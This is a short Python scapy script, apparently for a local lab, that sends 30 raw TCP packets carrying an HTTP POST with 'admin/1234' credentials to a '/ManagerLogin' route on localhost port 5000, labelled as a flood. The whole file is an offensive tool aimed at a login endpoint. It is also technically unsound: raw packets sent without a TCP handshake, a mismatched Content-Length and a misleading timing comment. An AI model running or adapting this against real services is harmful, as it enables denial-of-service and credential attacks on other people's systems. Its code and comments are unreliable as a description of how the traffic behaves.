import scapy.all as scapy
import time

target_ip = "127.0.0.1"
target_port = 5000

def post_flood():
    payload = (
        b"POST /ManagerLogin HTTP/1.1\r\n" # vulnerable route
        b"Host: 127.0.0.1\r\n" # vulnerable host
        b"Content-Type: application/x-www-form-urlencoded\r\n" # vulnerable content type
        b"Content-Length: 100\r\n" # vulnerable content length
        b"\r\n" # end of headers
        b"username=admin&password=1234"
    )

    ip = scapy.IP(dst=target_ip)
    tcp = scapy.TCP(sport=scapy.RandShort(), dport=target_port)
    packet = ip / tcp / payload

    for i in range(30):
        scapy.send(packet, verbose=False)
        time.sleep(0.1) # send 30 packets every 0.1 seconds
        print(f"Sent packet {i+1} to {target_ip}:{target_port}")
post_flood()